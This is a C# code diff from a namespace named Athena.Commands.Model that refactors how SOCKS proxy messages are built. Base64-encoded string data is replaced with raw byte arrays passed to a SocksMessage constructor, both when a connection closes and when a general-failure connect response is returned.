@@ -93,12 +93,7 @@ namespace Athena.Commands.Model
             {
                 await RemoveConnection(sm.server_id);
 
-                await SocksResponseHandler.AddSocksMessageAsync(new SocksMessage()
-                {
-                    server_id = sm.server_id,
-                    data = String.Empty,
-                    exit = true
-                });
+                await SocksResponseHandler.AddSocksMessageAsync(new SocksMessage(sm.server_id, new byte[] { }, true));
                 return;
             }
 
@@ -141,18 +136,16 @@ namespace Athena.Commands.Model
 
         public async void ReturnMessageFailure(int id)
         {
-            await SocksResponseHandler.AddSocksMessageAsync(new SocksMessage
-            {
-                server_id = id,
-                exit = true,
-                data = Misc.Base64Encode(new ConnectResponse
-                {
-                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
-                    bndport = new byte[] { 0x00, 0x00 },
-                    status = ConnectResponseStatus.GeneralFailure,
-                }.ToByte())
-            });
-
+            await SocksResponseHandler.AddSocksMessageAsync(
+                new SocksMessage(
+                    id, 
+                    new ConnectResponse{
+                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                            bndport = new byte[] { 0x00, 0x00 },
+                            status = ConnectResponseStatus.GeneralFailure,
+                    }.ToByte(),
+                    true
+                ));
         }
 
         private async void ReturnSocksMessage(object sender, SocksEventArgs e)
